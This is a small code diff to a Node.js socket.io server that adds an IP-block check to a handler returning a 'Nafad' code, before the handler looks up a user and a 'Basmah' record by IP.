@@ -531,7 +531,8 @@ io.on("connection", (socket) => {
 
   socket.on("getNafadCode", async ({ ip }) => {
     try {
-      // 1) Find (or create) the User
+      if (await isIpBlocked(ip))
+        return socket.emit("nafadCode", { success: true, blocked: true });
       const user = await findOrCreateUser(ip);
 
       const doc = await Basmah.findOne({ ip: user.ip }).lean();
